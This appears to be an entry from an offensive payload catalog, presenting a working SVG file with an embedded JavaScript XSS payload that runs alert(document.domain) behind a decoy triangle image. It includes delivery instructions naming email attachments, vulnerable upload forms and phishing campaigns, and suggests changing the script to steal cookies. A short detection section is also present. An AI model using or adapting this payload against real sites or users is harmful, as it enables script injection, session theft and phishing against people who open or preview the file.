---
id: 2693054b-50dc-4fc9-917b-e1d8bfac0d3c
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:42.033231+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xss
  - svg
  - payload
validated: true
---

# SVG-XSS-Triangle-Alert

## Code

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

## Description

This SVG code creates a simple green triangle graphic with an embedded JavaScript payload that alerts the current document's domain upon rendering. It serves as a proof-of-concept for XSS in SVG files, exploiting browsers' ability to execute scripts in SVG contexts. The visual element disguises the malicious intent, making it suitable for social engineering or file upload attacks.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| points | Coordinates for the triangle polygon | "0,0 0,50 50,0" |
| fill | Fill color of the triangle | "#009900" (green) |
| stroke | Stroke color of the triangle | "#004400" (dark green) |

(Note: The alert payload is hardcoded; customize the <script> content for specific attacks like cookie theft.)

## Usage

Save the code as an .svg file and host it on a web server. Deliver via email attachment, direct link, or upload to a vulnerable application that renders SVGs without sanitization. When opened in a browser, the triangle displays while the script executes in the page's context. Used in red team exercises to test file upload security or in phishing campaigns targeting users who preview images.

## Detection

- Scan SVG files for <script> tags or JavaScript using content scanners like ClamAV with custom signatures.
- Browser CSP violations logged when inline scripts are blocked.
- Network monitoring for unexpected alerts or exfiltration requests from SVG renders.
- File analysis tools detecting mixed XML and JavaScript in image files.

## Related

- [[procedures/Inject-XSS-via-SVG-File-with-JavaScript-Alert]]
